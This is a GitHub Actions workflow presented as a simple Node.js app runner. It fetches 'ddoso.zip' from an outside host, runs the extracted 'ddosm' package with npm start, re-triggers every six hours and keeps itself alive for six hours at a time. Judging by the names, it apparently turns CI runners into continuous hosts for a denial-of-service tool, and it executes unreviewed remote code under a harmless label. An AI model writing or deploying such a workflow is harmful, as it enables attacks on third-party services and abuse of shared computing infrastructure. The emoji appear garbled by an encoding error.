name: üöÄ Node.js App with npm start

on:
  workflow_dispatch:  # Manual trigger
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours

jobs:
  run-app:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours max
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      
      - name: Download and extract application
        run: |
          wget -q https://reality.mahmud-tech.online/ddoso.zip
          unzip -q ddoso.zip
          echo "üìÅ Extracted files:"
          ls -la
      
      - name: Find app directory and run npm start with keep-alive
        run: |
          # List all directories
          echo "üîç Available directories:"
          ls -d */
          
          if [ -d "ddosm" ]; then
            echo "‚úÖ Found ddosm directory"
            cd ddosm
            echo "üìç Working directory: $(pwd)"
            
            echo ""
            echo "üì¶ Installing dependencies..."
            npm install --legacy-peer-deps
            
            echo ""
            echo "üöÄ Running npm start with keep-alive..."
            # Run npm start in background and keep the job alive
            npm start &
            
            # Get the PID of the npm start process
            NPM_PID=$!
            
            # Keep the job alive with periodic output
            echo "Process started with PID: $NPM_PID"
            
            # Monitor loop to keep the job alive and check process status
            while kill -0 $NPM_PID 2>/dev/null; do
              echo "‚è≥ Application is running... $(date)"
              sleep 60
            done
            
            # Wait for the process to finish (if it does)
            wait $NPM_PID
          else
            echo "‚ùå Directory 'ddosm' not found"
            exit 1
          fi
